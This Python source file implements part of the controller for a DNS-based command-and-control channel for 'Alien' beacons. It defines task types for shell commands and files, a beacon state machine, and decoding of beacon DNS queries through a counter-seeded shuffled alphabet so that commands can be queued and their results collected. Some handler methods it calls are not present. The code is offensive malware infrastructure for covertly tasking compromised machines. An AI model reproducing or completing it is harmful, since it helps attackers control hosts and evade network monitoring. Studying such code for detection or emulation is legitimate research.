import logging
import socket
import zlib
from enum import IntEnum

from Alien.utilities.communication import BeaconResponse, BeaconResult, ResultCodes
from Alien.utilities.encodings import (
    CHARACTER_SET,
    bruteforce_base32,
    decode_possibly_padded_str_into_int,
    determine_shuffled_alphabet_from_seed,
    encode_int_into_str,
)

logger = logging.getLogger("dns_c2")

class MessageTypes(IntEnum):
    first_alive = 0
    send = 1
    receive = 2
    send_and_receive = 3
    main_alive = 4

class TaskTypes(IntEnum):
    static = 43
    cmd = 70
    compressed_cmd = 71
    file = 95
    compressed_file = 96

class BeaconStates(IntEnum):
    firstalive_done = 0
    payloadsize_sent = 1
    pending_commandresult = 2
    receiving_commandresult = 3
    sleeping = 4


CODE_FOR_ZLIB_DEFLATED_OUTPUT = 61

MESSAGETYPE_FOR_BEACON_STATE = {
    BeaconStates.firstalive_done: None,
    BeaconStates.payloadsize_sent: MessageTypes.receive,
    BeaconStates.pending_commandresult: MessageTypes.send,
    BeaconStates.receiving_commandresult: MessageTypes.send,
}

class AlienBeacon:
    def __init__(self, id, counter):
        self.id = id
        self.counter = counter
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)
        self.command_sent = ""
        self.buffer_size = 0

        self.command_queue = []
        self.result = b""
        self.state = BeaconStates.firstalive_done

    def log(self, message, loglevel=logging.INFO):
        logger.log(level=loglevel, msg=f"[BEACON {self.id}] {message}")

    def get_next_command(self, remove_from_queue):
        if len(self.command_queue) <= 0:
            raise ValueError("Could not fetch the next command because no further commands were scheduled!")
        next_command = self.command_queue[0]
        if remove_from_queue:
            self.command_queue.pop(0)
        return next_command

    def encode_expected_prefix(self):
        expected_message_type = MESSAGETYPE_FOR_BEACON_STATE[self.state]
        if expected_message_type is None:
            return encode_int_into_str(self.id, self.alphabet)
        return encode_int_into_str(expected_message_type, self.alphabet) + encode_int_into_str(self.id, self.alphabet)

    def update_counter(self):
        self.counter += 1
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)

    def process_request(self, data):
        currently_expected_prefix = self.encode_expected_prefix()

        if not data.startswith(currently_expected_prefix):
            return False

        remaining_data = data[len(currently_expected_prefix) :]

        if self.state == BeaconStates.firstalive_done:
            return self.process_payloadsize_request(remaining_data)
        if self.state == BeaconStates.payloadsize_sent:
            return self.process_command_receive_request(remaining_data)
        if self.state == BeaconStates.pending_commandresult:
            return self.process_initial_commandresult_request(remaining_data)
        if self.state == BeaconStates.receiving_commandresult:
            return self.process_continued_commandresult_request(remaining_data)

        raise ValueError(f"Unexpected data stream {data}")